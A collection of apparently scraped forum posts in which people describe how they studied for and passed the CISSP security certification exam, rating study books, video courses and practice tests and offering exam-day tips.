I've also been working as a ""Server & Network Administrator"", leading the Network & Security team and Helpdesk team.  I've been working here for a little over 5 years, since I was hired on to an empty team right out of college, and learned everything on my own as I went.  It's been a long journey of having to just ""figure it out"" since I didn't have a mentor or someone who could teach me.  Just lots of google, troubleshooting techniques, trial & error, and tackling problems as they came along.  My job responsibilities include creating and managing Windows servers, SAN devices, a lot of old undocumented proprietary software, automation through powershell & command prompt scripting, data backups, SQL database management, IIS, active directory, DHCP, DNS, and network device (routers, switches, etc), PCI DSS audits, etc.  Basically a jack of all trades, master of none.

Originally I was going to go down the Networking route, but for these past couple years, I've been on a daily call with our parent company's Security team, and one of them mentioned having previously worked in Networking, but moving to Security as the market was in higher demand and the pay scale was higher, which perked up my ears.  I mostly sit quietly on the call and wait for something about our office or users to be mentioned, but being able to listen to them talk smart guy stuff and go over the SIEM and other cool software has been a huge motivator.  Then they recommended I go for CISSP.

Luckily, my job responsibilities have included things such as PCI DSS and ISO audits, and generating policies and procedures (Domain 1), data encryption and access controls (Domain 2), vulnerability scanning, patching vulnerabilities, establishing virtual & physical servers, and public server cryptography (Domain 3), network device configuration and hardening as well as port security (Domain 4), active directory and user security rights management (Domain 5), and (*unfortunately*) incident response and log management (Domain 7).  Thus, while I haven't worked specifically in security, I have had a little bit of experience across a lot of things... which I thought kind of fits perfectly with the ""mile wide, inch deep"" mentality.  I wouldn't say my experience was very big, but it helped me relate certain topics to work.

    My Resources

So... I kind of get nervous when it comes to studying and try to [get every resource](https://imgur.com/utz3mdE) I can find.  Which is a bit overkill, but at least I can see what sticks with me.  Admittedly, I'm more of a visual learning than a textbook reader.

**Thor Teaches on Udemy**    
This was my main resource, and where I gained the most knowledge.  I would load up these videos whenever I could focus and stare at the screen.  I even picked up a Microsoft Wireless Display Adapter so I could cast my browser on my Surface to my TV and sit on my couch and listen.  Great content, and his notes were fantastic.  I ended up printing out all his PDF notes and putting them in sheet protectors in a binder.  The only thing that sucked is that by grouping the lessons into two-domain courses, some courses (like the one that includes D3 & D4) end up being much higher value than the ones that focus on smaller domains.  Still, I'd highly recommend the series.  9/10

**Certification Station on Discord**    
This server on Discord was fantastic.  It really kept me motivated, and helped me work through the thought process on various questions.  If you stay active in the channel, you'll end up doing hundreds of practice questions without even thinking about it.  11/10

**MindMap videos by Rob Witcher on YouTube**    
I'm pretty sure I'm responsible for hundreds of plays on these videos.  These videos became my main audio source while walking or driving to work, and I'd even listen to them as I went to sleep.  It's a great way to refresh important topics as well as quickly go over a chapter before diving into it with a main resource.  And they're free.  Not enough deep info to learn everything, but just about the perfect  review resource.  You're crazy if you don't utilize these.  10/10

**CISSP Cert Prep (2021) by Mike Chapple on LinkedIn Learning**    
Some people like Mike Chapple's teaching method, and some don't.  But his updated LinkedIn Learning videos are very well produced, and include chapter quizzes to make sure you're taking in information rather than just zoning out.  It was another source I used primarily for audio, or for getting another perspective on a confusing topic from Thor's videos.  I do think it sometimes focused on less important things and glanced over big topics, but that may be because the course is designed to go along with the Official Study Guide textbook.  7/10

**Kelly Handerhan's CISSP course on Cybrary**    
Kelly is very passionate about what she teaches, which helps keep you motivated, but this video series really lightly glosses over the information.  It can serve as a good review or refresher, but shouldn't be your main video source.  However, it's free, so still nice.  5/10

**Adam Gordon's notes**    
So everyone on Certification Station knows of Adam's notes, which are freely available on the Discord server.  They've been formatted into a nice format by some users in the server that have made reading a lot easier.  I'm not sure if his ITPro.TV course offers something nicer, but I'd say the only thing these notes lack is looking nice and organized.  Otherwise, they are FULL of information and tricks to help remember certain things.  I'd highly recommend reading through these at least once.  8/10

**ISC2 CISSP Official Study Guide (2018)**    
Honestly, I didn't use this much.  I tried to read through it, but I felt it really dragged on through certain topics.  There's no reason Domain 2 should get as many pages as it does.  After reading through a few chapters, this became more of a reference book.  I'm sure it would be great for those that can read through it in full, but I couldn't do it.  6?/10

**CISSP Study Guide (3rd Edition) by Eric Conrad**    
I picked this book up because it was shorter than the OSG.  Where the OSG wanted 140 pages for something, this book covered it in 60.  Most of the reading I did came out of this book.  I highly preferred the condensed design, but the book was certainly showing its age.  This ""latest"" edition is from 2016, and could do with some updates.  6/10

**CISSP For Dummies (6th Edition)**    
I felt this book was great!  I don't see it recommended here enough.  It's from 2018, so reasonably updated.  I didn't read it through fully, but I could see it being a very competent primary reading source.  I used it mostly for reference to double-check things that didn't make sense in my video studies, or practice questions that confused me.  The only thing really lacking in this book is that the site for redeeming the online practice exams is defunct, so you have to call their support line to get an activation code on their new site.  Not a huge issue as I didn't really use their practice questions, but a noticeable issue.  It's also still smaller than the OSG.  7/10

**11th Hour CISSP by Eric Conrad**    
This book was just ok.  I bought both the physical and Audible versions.  Some people said they used it as a review after going over everything, but I think it's too light for that.  I think it would do well as an introduction book when you're first starting your studies and want to dip your toes into each domain first over the course of 200 pages.  Nothing to really learn much info from, but a good way to understand the general topics you'll be diving into.  5/10

**The Effective CISSP by Wentz Wu**    
This book is designed to be a focus on Domain 1 and 2, with a touch of 3.  For the most part, it does that.  I was expecting it to go into further detail than what I had already learned, but that wasn't really the case.  If you've paid attention in your primary study source, this will mostly just repeat what you've already learned, but that can be nice if it's been a while since you went over these topics.  It does give a good description between various steps and such.  Is the book necessary?  Not really... but if you want to hammer in these particular domains, it's a nice addition if you have time.  7/10

**How To Think Like a Manager by Luke Ahmed**    
I'd definitely recommend this book.  It's cheap, and goes over 25 questions and the thought process you should go through.  Best of all, it goes through a VARIETY of questions you would go through, such as ""pick the best out of a list of potentially correct answers"", ""you can easily eliminate two of these"", ""the actual question is asking you for something that can specifically be answered by only one of these"", etc.  The only issue I had with the book was one question (Q14) that focused on firewall architecture ""tiers"", which is not listed in any textbook, and the only video source I could find was one by Luke, and I still couldn't determine what a ""three-tier 2"" architecture and such were.  I spent a couple hours trying to figure this out, but then all of Certification Station agreed it didn't make any sense, and wouldn't show up in the exam, which it didn't.  8/10

**CISSP Exam Guide Ultimate Edition 2021 by Walter Roberts**    
Look... Stay away from this.  It's useless.  The layout is terrible, it looks like it was typed up in Microsoft Word and printed, it skips over important information, and focuses way too heavily on stupid stuff (we don't need two pages on what Malware is).  When I was going through my CCNA studies, I found a cheap book on Amazon called ""CCNA 200-301 Quick Reference Guide"" that was like $12, and 112 pages.  It included all of the exam objectives with a brief description and notes about each objective, allowing the reader to quickly reference each objective and see if they knew the topic or needed to read more.  I was looking for a cheap book that did something similar... just a quick reference of each topic so I could determine if I've missed something.  This book was not that.  At all.  The only reason it gets any points is because it was cheap.  2/10

    Practice Exams  & Quizzes

I used a ton of practice exams and quiz sources... I used the official ISC2 practice exam book, I used CCCure, I used practice questions from all the textbooks above, I used the new Pocket Prep app (whatever it's called now), Wentz and Adam's Q of the Day, etc.  Certification Station itself is a huge conglomerate of practice questions from various sources, so its hard to tell which one was which.  I wouldn't say I went through thousands of questions like many people here... probably a total of like 500-600.  Like many people here say, the practice exams are not like the real thing.  There may be a question or two that pop in and seem similar, but generally those questions are freebie questions anyways (straight to the point definition-like questions).  What I really aimed to do was identify my weak spots and then study those sections.  For me, the new Pocket Prep app was really useful for this because it gives a readout of your proficiency in each domain so I could see which ones I was lacking, and then go back and review those.

But honestly?  Whatever you're using is probably fine.  Don't be like me and waste a huge amount of time and money trying to find the ""best"" practice exams.  There aren't any, and ISC2 send C&D's to people who create questions too similar to the real thing (like with Wentz).  So you're not going to find perfect practice questions.  Just find something that helps you pinpoint your weak spots, and then review those sections.  The best thing you can do is practice and test your knowledge, so just find something and study.  Try to use a couple resources if you can so you can get a variety.

    In Closing...

The exam was tough.  I'm still surprised I passed, but it's encouraged me to continue my studies.  I wouldn't say I'm wayyy more knowledgeable than I was before I started studying... but that may be because I had a good basepoint.  I certainly learned a few interesting and useful things, and hammered down some stuff that I lightly touched on in other certs.

I plan on taking CISM next since the material is similar.  A lot of people just said to go take a few practice exams and then take the real thing, but I want to read through a bit before taking it, as I still feel like there are some CISSP topics I'm not too familiar with.  After that, I'm hoping to either jump into CySA+ or eJPT... I just feel like I've taken a lot of certifications involving knowledge and procedures, but I still have a huge feeling of Impostor Syndrome, and I don't feel like I have as many practical skills as I'd like.  I was offered a few ""Senior Security Analyst"" positions just minutes after posting that I passed the exam, but I still feel too inexperienced.  So overall I'm trying to find something that can prepare me for a more security-centric job.

Sorry for the novel here... just trying to be thorough.",2021-08-09
2665,ogfy0o,Passed the CISSP exam last week. Here's how I studied.,"I'll start with a big thank you to everyone that has posted what worked or didn't for them while studying. I gained a lot of insight browsing through numerous posts. I don't have any incredible insights, but below is what I used to pass the exam and hopefully someone can get some use out of it.

Almost all of the sources I used are available for free via O’Reilly/Safari Online if you have a DoD email.

 

Video Courses:

- Cybrary CISSP Video Course [Free]- Kelly Handerhan (15 hours) 
This course does a tremendous job of highlighting all of the major topics in each domain. Provides examples that make concepts relatable and easy to digest.


- CISSP Certification Video Boot Camp [Free w/O'Reilly account] – Thor Pederson (24.5 hours)
Provides a lot of practical examples. Examples are framed in a way that aligns to the “CISSP mindset.”


- CISSP Cert Prep [Free trial via LinkedIn Learning] – Mike Chapple (24 hours)
This was the only source updated for the new version of the exam released in May that I used. This series does a good job covering Domain 3 compared to the other sources.

- CISSP Complete Video Course, Second Edition [Free] – Sari Greene (26 hours)
This course is more formal and in-depth, heavily focuses on practical application of topics (some are not relevant to the exam).

- Mind Map [Free] – YouTube (6.5 hours)
Short and well-produced. They do a good job of summarizing topics within each domain and provide an organized view of the material. It’s a good source for a quick overview of each Domain or as a last minute review.



Text Materials:

- Eleventh Hour CISSP Study Guide [Free with O'Reilly]
Good for an overall introduction to CISSP topics. Some of the topics are dated, so keep that in mind if you use this for review.
 
- (ISC)2 CISSP Certified Information Systems Security Professional Official Study Guide 8th Edition [$40]

- “Sunflower” CISSP Summary Version 2.0 [Free]
Wasn't a fan of this, but I did use it as a final review.
 

Practice Exams:

-(ISC)2 CISSP Official Study Guide, 8e [Free if you buy the book]

- CISSP Official (ISC)2 Practice Tests [Free with O'Reilly account]


Misc:

- Why you WILL pass the CISSP – Kelly Handerhan via YouTube
Great job of covering the mindset you need to pass the exam.

- Essential CISSP Exam Guide: 2018 CBK [$14.99] – Audible (17 hours)
The audio quality is not the best, but I found this to be useful when I didn’t have time to sit down and study.

 

My Study Schedule:

I studied over a 3 month period. The first month was largely spent easing into an overview of each domain and trying to establish foundational knowledge to build upon later. During the first month I totaled 62 hours of study, a little over 2 hours per day. The second month was focused on diving deeper into the material, powering through multiple video courses, and taking a couple practice exams to determine where I stood. During the second month I increased my total study hours for the month to 82, averaging approx. 2 hours and 40 minutes per day. I spent the final month reading the official study guide and taking practice exams (I answered approx. 1,500 questions during this period). Overall, I spent 110 hours studying in this final month, averaging a little over 4 hours per day. I increased my study efforts during the final week before the exam, studying 36 hours during the final 7 days. All of this time was spent reviewing and not trying to learn new material.

 

Recap:

Month 1: 62 hours (2 hrs/day) - Intro to each domain
Month 2: 82 hours (2.5 hrs/day) - Deep dives
Month 3: 110 hours (4 hrs/day) - Practice Exams and reviews
 

Final Thoughts:

1. Develop a plan early and stick to it. Use some of the shorter study items to identify your strong and weak domains. Build your study plan around these results.

2. Don’t try to become an expert in your weak domains. Put in the time to become proficient, but don’t ignore the other domains.

3. Learn the logical processes as opposed to memorizing exact steps. Understand how everything fits together instead of memorizing definitions.

4. Remember to approach the test with the appropriate mindset.

5. Practice tests are important to identify knowledge gaps, but don’t try to memorize the answers. Read the explanations and try to understand why each answer is the correct choice.

6. Take a few breaks from studying where you don’t review any CISSP material for a day or two. Especially the day before the exam.

 

TLDR: There is a lot of free material available to those with a DoD email account. Set a goal and stick to it. Take some breaks and find time to relax and have some fun. Spend time reviewing questions on the exam and approach the test with the appropriate mindset. When you get close to your exam date, trust that you've done enough to prepare yourself and take a break the day before. Best of luck!",2021-07-08
2666,opgpgp,"Passed CISSP, 100 Q, <1 hour","I (provisionally) passed my CISSP exam, 100 questions, under an hour (I believe 51 minutes?) and I *significantly* over prepared. I don't say this as bragging, but as a touch-point so others might have a guide of ""what's enough"" and ""what's *too* much."" Also looking back on my journey is through the lens of what I know now, I might be overly critical of some resources. *To that end* I may be over-critical of some resources as not being helpful, but as it's difficult to divorce my viewpoints from my perspective to that end, I'll just give you as honest-as-possible evaluation of what I used.

My main takeaway is: The most productive parts of my journey were a tight feedback loop of practice exams, identifying weak points, studying, and repeat. 

# Before CISSP

I have \~9 years of IT/technical experience, 4+ of which was a wide-spread role containing cybersecurity, IR, limited forensics, DLP, and security tool administration. The last 9-10 months have been as a Cloud Security Architect. All of this has been at the same organization, a Fortune 100 enterprise.

Previously I've obtained the following certifications that the studying of helped (at least in part) for the CISSP:

* Security+
* SANS GCIH
* CEH (Masters)
* Cloud+
* AWS Certified Cloud Practitioner
* AZ-900
* AZ-104

In addition I took the OSCP class, and worked some of the labs, but did not attempt the exam. Retaking the class and reattempting the exam is a 2022 or 2023 goal for me.

# Studying for the CISSP

I began with the 11th hour. I guess it was nice, but it felt way too high level. I know a lot of people say this is a great last-minute prep, but I really can't agree with that. It was so high level and detail-lacking I can't really see the value. I guess it was a nice first pass? In hindsight, the [CISSP Mindmap video](https://www.youtube.com/playlist?list=PLZKdGEfEyJhKWyryIvx_jm1jn6ZMTi7gW) series would have been a much better first pass. Note, I didn't study the 11th hour, just read through it once.

I also listened through, twice (just because it was long-car-trip material) the [Essential CISSP by Phil Martin, Second Edition](https://www.amazon.com/Essential-CISSP-Exam-Guide-Knowledge/dp/B07JDJV47Z). I thought it did a decent job, and if you would like to study during car trips, it's the best audio book I found. I tried some others, but I wouldn't recommend them.

Next I went through a period of practice exam, official study guide, rinse, repeat. The first practice exam I took was the OSG's companion exam, then my three worst chapters in the OSG, then BOSON A, then the half-dozen worst chapters in the OSG (which did see some overlap), then BOSON B, the worst 3 chapters *and* the OSG's domain exams over the three worse domains, then BOSON C. I made notes along the way and reviewed the notes. I did all BOSON exams in ""study mode"" and if I missed the question I would screenshot the relevant parts of the explanation and added it to my study material. For the OSG practice exams, I would review the missed questions and also produce notes from them. All of my notes I went over at least twice, sometimes as many as six times. This being said by the time I had finished this, half of the OSG hadn't been touched, and I did not exhaust either the OSG practice exams (or close to it) or the BOSON exams. However the exams were different, so I would recommend both.

As a small aside, all of my study material was for the previous version of the CISSP. I did not feel like this left me ill prepared for the new version to any extent whatsoever.

Another small aside, I did watch a hodgepodge of videos on YouTube to focus in on any topic I felt uncomfortable with. My total time watching such videos was <6 hours, including repeating videos.

I also watched ""[Why you WILL pass the CISSP](https://youtu.be/-99b1YUFx0A)"" and read through [How To Think Like a Manager](https://www.amazon.com/Think-Like-Manager-CISSP-Exam/dp/1735085197/ref=sr_1_3?dchild=1&keywords=Think+like+a+manager&qid=1626967662&sr=8-3) during the weekend before my exam. I think they were both important, and added value. *However* I feel like the mindsets pushed in these study materials--*while valuable in the real world*\--weren't as important to the CISSP as they made it out to be. Still, do yourself a service and go through both of them.

Near the end of my preparations, I noticed I would read a practice question, and be able to *sometimes* articulate why two different answers were correct. Not in a ""these are both good answers, but I need to pick the best of the two,"" sort of way, but as a critique of the question author sort of way; I could display a deeper understanding that showed I understood the question; I was able to articulate an important security or business consideration that made it easy to justify multiple answers without more information. Thankfully on the actual exam I only came across one quesiton where I felt like I needed more information.

This level of understanding was probably the best sign I had that I was ready for the CISSP.

I was willing to accept if I picked a wrong answer in BOSON, the OSG exams, or Think Like a Manager, but about 1/3 - 1/5 of the time when I got a wrong answer I felt like I had a valid critique of the question, I would count myself as having gotten that question right. To that end, I was scoring about 85% on my last BOSON exam (first time taking the exam, I never repeated BOSON exams) and \~75% on my OSG ""trouble domains"" (domains where I was needing the most studying).

Lastly I will say please avoid the ""Inside Cloud and Security"" CISSP exam cram. I really hate saying this since his videos are engaging, clear, and generally well explained, however they suffer in three key ways. First what he decides to talk about feels like a patchwork of topics within the domain--or at least that's my view after having studied the domains--rather than a complete picture. Second, he often skips pass topics with a quick definition that really aren't valuable to you during the exam without actually understanding the topic, so it might give a false sense of readiness. Third, and most importantly, some things he says are outright wrong, which is dangerous for the exam. It felt like he got things that were more academic and less practical wrong, which makes sense given that he admits he did very little studying and depended on his extensive industry experience. 

# Final Thoughts/Summary

So the biggest reason I typed all of this up is to provide some context as to how to slam dunk the exam, and when you probably will slam dunk the exam. It also seems people are very hesitant in saying what % of practice exams will see that you pass, so here's my guide:

You're certainly ready to take the exam:

* When you're getting 80%+ on BOSON *from understanding the questions and not rote memorization.*
* When you're getting 75%+ on the OSG comprehensive exams *from understanding the questions and not rote memorization.*
* When you're getting 70%+ on the OSG domain-specific exams for your weakest trouble areas *from understanding the questions and not rote memorization.*
* After you go through the provided ""Think Like a Manager"" materials
* You have gone through all of the questions you missed, understand why you missed them, and spent time understanding accompanying material (if you miss a question about why a certain encryption technology is a bad choice in a specific situation, and another is a good choice, study both technologies in a broader sense, and loop in a third, forth, etc, technology that might be comparable)

This was where I was at, and, again, I was more than ready for the exam. Actually during the exam do basic good test taking skills such as ""carefully read the question, make sure you understand it, eliminate two answers,"" etc.

Also I will say the OSG exam *and* BOSON had questions that were grossly in the weeds such as ""you need to network two devices over X distance and you need Y speed. What Ethernet cable would you need?"" or ""A user is currently using 802.11(whatever). They want to upgrade to X speed. What 802.11 technology would your recommend?"" 

Do NOT worry about memorizing any tables of raw numbers like these. I saw NOTHING on the exam that was that in-the-weeds. Plenty of technical or semi-technical questions, but no rote memorization of numbers. In real life this is something you can certainly look up, or you deal with so regularly that you'll learn it as a matter of course.

I'd be happy to answer any questions that I can that respect the CISSP NDA.",2021-07-22

2. Adam Gordon (ITPROTV, New 2021 version CISSP Fast-track Course)
3. Prabh Nair’s YouTube Videos - Very important, Do not skip these videos.
4. Destination Certification YouTube Videos - Watched these videos many at times during preparation. Watched few videos night before exam also and they were spot on.
5. Mike Chapple last minute exam review
6. 11th hour CISSP and Memory palace by Prashant Mohan
7. And bunch of random Google search, Wikipedia, and YouTube videos.

Initially I started marking on book but soon I realized, it was going into my volatile memory. I needed it in my secondary memory so I started writing notes for each domain and they helped me a lot. This was the best decision of mine.

Group study on google meet for 2 weeks with 2 other aspirants. We studied for almost 3 hours daily and 8 hours on weekend just 3 weeks before the exam. Best part is, all 3 of us PASSED. I am sure they are reading my post right now ;)

My discord group is still active where many people are preparing to appear for the exam.

**About the exam:** It’s true that the real questions are different than the practice ones however; if your concept is clear then you would be able to rule out at least 2 options most of the time. Read questions carefully. Keep maximum 1 minute for each question and if you take more than that then cover that gap with the straight forward questions. Watch these 3 videos for the right mindset before you go for the exam–

Please focus on each topic and try to understand in detail. Write notes, read your notes daily, ask question to yourself and give answer to yourself. If you are satisfied with your answer, you are good to go. Pay special attention to words which have synonyms mentioned in the book.

I am happy to answer your questions while ensuring that I remain compliant towards the Code of Ethics. Good luck with your studies.

I just took my time and made sure I understood each question and all answer options before choosing my answer - and apparently this time it actually worked. I used my previous exam knowledge and the ninth edition of the ISC^(2) Official Study Guide (Stewart, Chapple, and Gibson). Most importantly, if you don't pass, don't give up!

Edited to add: I also used my score report from previous exams to focus on the areas I was weakest. I think this helped keep my weaker subject areas top of mind for the exam. Use this to your advantage if you have it.",2021-08-03
2669,oa20k3,Passed CISSP first attempt (4 week study),"A little background - I’ve been in the industry for 20 years and have a degree in IT (Network Management and Infrastructure).  I work for a company doing cyber security software integration, testing, and support. Much of what I do is more in the CEH realm and I have a broad background that includes management so all of this certainly helped.  I also own a Technology consulting and support company providing cloud solutions, network architect/implementation services etc.

The company I work for won a contract that requires CISSP certified personnel and I was tasked with getting certified with about 30 days notice.  To their credit, they paid for a one week CED Solutions boot camp and gave me an additional week off (paid) to prepare before the exam.   I didn’t want to let them down so I studied like crazy. If I wasn’t on my computer taking ‘cccure’ practice tests, I was on my phone doing practice quizzes from ‘Pocket Prep.’  If I was driving, I was listening to ‘Mind Map’ and ‘Inside Cloud and Security’ YouTube videos.  

The test is no joke! I felt unprepared going in and throughout the test, I was never confident enough to put money on a passing score. I think this is normal and I knew I was answering more correctly than not. So relieved that I can continue my life and enjoy the summer! I would say the biggest help for me was going through practice exams and thoroughly reading explanations for every answer.  I already knew things like the OSI model, common port numbers, PKI etc. but I still reviewed every explanation as I went through practice questions.  My attitude going in was, I’m not gonna stress over a fail. I planned to study harder and attempt again in 30 days. It didn’t help that my family, coworkers and friends knew I was studying and all wished me luck… that just added pressure I didn’t need. Or maybe I did need the pressure. I’m just glad I passed. Good luck to all in your endeavors!",2021-06-29
2670,orz3bf,5 Tips For Passing The CISSP Exam,"Thought I’d share some of my top tips for passing the CISSP exam.

**#5 Read and Relate**

“I don’t understand, I read the Shon Harris book 3 times! How did I fail the exam?”

You read The Odyssey.

You read The Old Man and The Sea.

You read To Kill A Mockingbird.

You don’t read a CISSP study guide.  You must relate and understand a CISSP study guide.

Software Development Security was my weakest domain.  I’d turn my computer speakers up, and listen to a 2-hour video about Software Development Security on YouTube or CBT Nuggets.  Then, I’d proceed to forget everything in three days.  I don’t create software for a living, which is why I had a tough time relating the Software Development Life Cycle (SDLC) to the real world.

But I did work in network security for a living.  A job in which I applied cryptography concepts into action through the use of VPNs and SSH every single day.  This is why cryptography became my strongest domain, I had the ability to relate what I read in CISSP study guides.  I’d read about symmetric and asymmetric encryption, and then apply it for customer devices and environments.  It was awesome.

In an effort to increase my knowledge about the SDLC though, I Googled and YouTubed all I could.  I’d Google things like “iphone software development process”, or “SDLC process used by Facebook”.  I’d read about these real world examples to better relate it to the CISSP books.

I found out too late that the CISSP is actually not a memorization test, it’s a test of concepts.  Keep that in mind as you study!

**#4 Obsess**

“I tried to make the game perfection” – Michael Jordan

How do you get good at something? You have to keep doing it over and over again.  If you want to be a good basketball player, you gotta put in hours shooting in the gym, learning how to dribble tighter, run faster, and shoot more accurately.  Michael Jordan obsessed over the game, and went on to become a basketball legend, and accumulate an estimated net worth of $1 BILLION!

Michael Jordan was the totality of all his training.

I remember obsessing so much over the CISSP that sometimes I neglected my friends, family, and general hygiene.  When obsessing, it’s hard to let go.   While driving, going to sleep, or eating, my obsessive subconscious would still think of a problem, and continue to work on it.

Obsession can be dangerous mentally, but with proper control, it can be an effective productivity tool.

Luckily, you can start the obsession phase 2 months before you take the actual exam.  This is the time to sleep, breathe, and eat CISSP.  Just study it everyday right up until the exam so everything stays fresh in your brain.

**#3 Write**

Not type. Not email.  Not text.

Write.

Pencil and paper.

Read about vulnerability testing, and then draw out a network topology map and place the firewalls, IPS, IDS, and servers where they should belong.

Read about system ring architecture, and actually sketch the proper and secure path for a system process.

Read about the OSI Model and actually draw out how a packet starts at the application layer on Host A, and travels up the layer to Host B.

Let the information you read, flow from your brain, through your arms, and to the tip of your pencil.  When you get a question about a packet having issues at the network layer on the exam, your brain will recall back to your hand motion of writing about it on a piece of paper.

**#2 Trust Yourself**

Before actually taking the exam, all I heard was that the CISSP was an incredibly tough exam.  This was in the days of the 250 questions and 6 hours of total mess-with-your-mind torture exam.

This is true.  But I’m here to tell you that it is a completely passable exam! It’s not that difficult.  The only way to do it is to follow the same formula as everyone else who has passed.  Get some real life security experience, study the Shon Harris books, take an ungodly amount of practice exam questions, and mentally prepare yourself to sit in an exam room for a prolonged period of time while being mentally tested.

After completing about 180 questions during the exam, I actually started to feel fairly confident that I will pass.  Before taking the exam, I felt 60% confident that I’d pass, even though I studied for 10 months.  It is only after passing, that I realized I should’ve trusted myself 100%.

I’m trying to boost your confidence now, and not after the exam.  If you study well, you will be a CISSP.  It is not that difficult.

If you understand the concepts, and can truly see the big picture as it relates to information security, and have done your best to study for the exam, then trust yourself.  You will pass.

**#1 Don’t Give Up**

The alarm rings at 8:00 a.m., but it’s your day off.

You came home from a tough week of work, spent time with your family trying to hide your exhaustion, then finally collapsing into bed.

You deserve some rest.

Then your brains reminds you about that alarm you set early in the morning.  You still have an exam to take in 5 weeks.  You may have failed it the first time, but you’re definitely not going to fail it the second time.  You still have to read more about Common Criteria and Spanning Tree Protocol.  You still need to nail down all the steps in a forensic investigation process.

I can tell you not to give up a million times.  I can tell you that dedicating yourself to study for the CISSP is the only way to pass the first time, but it’s ultimately your decision.

Don’t give up.",2021-07-26
2671,o8vuxh,Passed first time. 113 questions in 90 minutes.,"I passed on 21/6 and have been processing my thoughts on the entire journey before posting here.

# Relevant background:

* **BSc in Computer Science** from the University of Manchester
* 5 yrs at **Cisco** working on threat intelligence
* 1 yr at **CyberArk** as Security PMO for R&D
* 1 yr at **Deloitte** as a Senior Cybersecurity Consultant
* 2 yrs at **Microsoft** as a Senior Content Developer for Azure security products

I started looking into CISSP in my time at CyberArk but only really kicked off my proper studying 8 months ago.

|CISSP, Second Edition by Sari Greene|Videos (via [oreilly.com](https://oreilly.com)) |She suffers from the same verbal tic as Shon Harris: an overreliance on the word ""Now"" as a way to start a sentence or segway between ideas. It's really annoying after a very short time and so I had to quit after lesson 6. She also can't say ""hierarchical"" (but repeatedly does so, leaving out the second 'c'). (3/10) |

# Thoughts on the value of this whole process:

I've read a lot of negativity about the cert. Plenty of people (including current CISSP holders) who really don't think it's worth the paper it's printed on. At times, it certainly feels more like a money-making operation than a real 'test' of your knowledge. The annual fee of $125 also feels very steep, and unrelated to the goals. The fact that it's payable in the first year when they've already had $700 for the exam also feels pretty unreasonable.

I wasn't impressed with the quality of the questions in the exam. One in particular had a typo that enormously impacted the meaning of the question. I can't go into details, but the way it was written made no sense and I had to infer the intention. I noted it for reporting afterwards but I was too pumped up from the end of the test to actually do anything on the day. 

So now I have my provisional pass, and I'll have to pay my annual subs, and the exam scraped the surface of my knowledge, but was it worth it? I genuinely think I'll only be able to answer that with the benefit of hindsight a few years from now.",2021-06-27

2674,p3jdsz,"Obligatory ""passed at 103"" and some tips I haven't seen elsewhere","Passed today at 103!  Didn't have a lot of prior CISSP relevant experience (I have the required job experience, but most of my jobs barely touched on security topics).  The Security+ has about 50% overlap with the CISSP, and I highly recommend taking it first.  Consistently averaged 70-75% on all CISSP practice question banks across multiple platforms.  


Tips I haven't seen elsewhere:   
\-The test requires a good bit of reasoning / IQ test style stuff, and English comprehension.  A dozen questions had long paragraphs of information with one or two key words that totally changed the ""correct"" answer, so be sure you pay attention to *every single word* in the long format questions.

\-Skim the question, read the answers, then read the question carefully again.  The answers frequently tell you what part(s) of the long paragraph are the most important.

\-Brain dumping in the exam room: memorizing key acronyms/mnemonics, security models, OSI model, basic ports, encryption and hashing algos, other models, formulas, etc is a good idea.  When necessary, come up with your own ways to remember them rather than relying on frequently terrible mnemonics in books.  Once you're in the exam room, guess what!  You're allowed to brain dump everything you memorized on to paper!  This helped me save a lot of brain clock cycles, as I didn't have to run through everything I'd memorized mentally, and could glance at the paper for the relevant information. 

\-As Handerhan mentions, when ethical questions are at stake, lean towards the most ethical.  I don't want to elaborate further, but one question I got was really tailored to make me choose the ""unethical"" route, and IRL I likely would have - because I personally IRL knew the ""correct"" answer, and the ""unethical"" answer really wasn't unethical IRL -- but in the exam, you frequently have to work with the information presented in the question.  

\-About 3 of the questions were totally baffling.  I'd never read or heard about any of the concepts in the question or answers, and the question itself wasn't entirely clear.  Try to suss out what they're getting at, eliminate incorrect or non-real answers, and roll the dice.

\-Read the question and answers multiple times.  Every word.  Don't reflexively give the seemingly correct technical answer when an obfuscated better answer may exist.  

\-Seriously, a lot of it is reasoning.  Figure out the key points of the question, eliminate wrong answers, then make a detailed mental analysis of the remaining answers.

\-You will encounter questions you've no idea what the answer is.  Think on it for a few minutes (you have time), eliminate wrong answers, guess, and move on.  This isn't a test you must get a 90% on to pass.  Many options are debatable.  

\-When complex topographies are described, try to imagine it in your mind, with the flow of traffic.  But I'm a visual thinker, YMMV.

\-Day of the exam: schedule the exam for a time of day that you're usually mentally sharp, sleep well, eat light meals, take your usual amount of caffeine (I like L-theanine, a natural supplement extracted from green tea that calms caffeine and brain jitters - not woo woo, it is proven.)  Watch Greenblatt's 2018 and 2020 Exam Tips on YT, and Handerhan's ""why you will pass the CISSP.""  Get out of the IT grunt mindset and in to the master mindset.  Greenblatt's ""think like Kirk and Spock"" metaphor actually helped me on a couple questions.  I'd catch myself being too Spock-analytical, switch to Kirk mode, and the answer would pop out.  Wear comfortable yet professional clothes to the exam (a nice outfit can psychologically make you feel important and get in the mindset, IMO), wear a short sleeved shirt in case it's warm, and bring a light jacket in case it's cold.  

\-My personal pre-public speaking/important moment ritual: Take a minute or two to collect your thoughts and calm your mind.  Imagine yourself striding out successful.  Find a wall and stand against it and fix your posture.  Smile.  Feel the badassery flow through you.  YOU have come far enough and learned enough to sit for this $750 exam.  You can do it.  If you fail, there's always 30 days from now.  Breathe, stretch, fix your posture again, smile, and get to work!      


\-Read CISSP Sybex 8th edition once  
\-Listened to Inside Cloud and Security free youtube videos while in the car - they have great free pdfs of the slides for study - Mind Map videos are more entertaining to watch, but the shorter video format isn't conducive to car rides.  
\-Paid $20 for Pocket Prep for a month - it was useful to get info on what domains to focus on and to have a portable practice option.  Questions seemed very similar to the Sybex free questions.  A day before the exam, I went through and cleared out all the missed questions by getting them correct.  
\-Did a few hundred Sybex practice exam questions - would tab out and google stuff as needed to reinforce.  
\-These ""cheat sheets"" are also awesome: [https://cdn.comparitech.com/wp-content/uploads/2020/01/CISSP-Cheat-Sheet-Domain-1.pdf](https://cdn.comparitech.com/wp-content/uploads/2020/01/CISSP-Cheat-Sheet-Domain-1.pdf) (change the last number of the URL to 1 through 8 and download each)",2021-08-13
2675,p0gh9k,"Passed, 100q","Been seeing a lot of ""Passed!"" posts so thought I'd throw in my experience.

Just took the exam last night and passed at 100 questions at a little over an hour.

The key takeaway I want to pass on to you if you're studying: ***you can do it!***

